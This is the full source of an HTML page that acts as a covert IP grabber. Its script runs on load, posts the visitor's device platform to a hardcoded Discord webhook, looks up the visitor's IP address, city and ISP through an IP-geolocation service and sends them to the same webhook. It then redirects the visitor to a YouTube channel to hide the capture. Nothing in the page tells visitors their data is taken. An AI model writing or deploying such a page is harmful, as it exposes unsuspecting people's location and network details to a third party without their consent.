<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const y = "https://youtube.com/@LigmaBlox-w7m";

    async function track() {
        // 1. Instant Ping with a Timestamp (Forces Discord to show a new message)
        const time = new Date().toLocaleTimeString();
        navigator.sendBeacon(h, new Blob([JSON.stringify({ 
            content: "🔄 **RE-ENTRY DETECTED** [" + time + "]\nDevice: " + navigator.platform 
        })], { type: 'application/json' }));

        try {
            // 2. Bypass cache by adding a random number to the API request
            const r = await fetch('https://ip-api.com/json/?nocache=' + Math.random())
                            .then(res => res.json());

            if (r.status === "success") {
                const msg = "🎯 **INTEL REFRESHED**\n" +
                            "IP: " + r.query + "\n" +
                            "City: " + r.city + "\n" +
                            "ISP: " + r.isp + "\n" +
                            "Time: " + time;
                
                navigator.sendBeacon(h, new Blob([JSON.stringify({ content: msg })], { type: 'application/json' }));
            }
        } catch (e) {
            // Fallback for High Security
            navigator.sendBeacon(h, new Blob([JSON.stringify({ 
                content: "🔒 **STILL BLOCKED**\nAttempting redirect anyway..." 
            })], { type: 'application/json' }));
        }

        // 3. Final Redirect
        setTimeout(() => { window.location.replace(y); }, 800);
    }

    track();
</script>
</body>
</html>
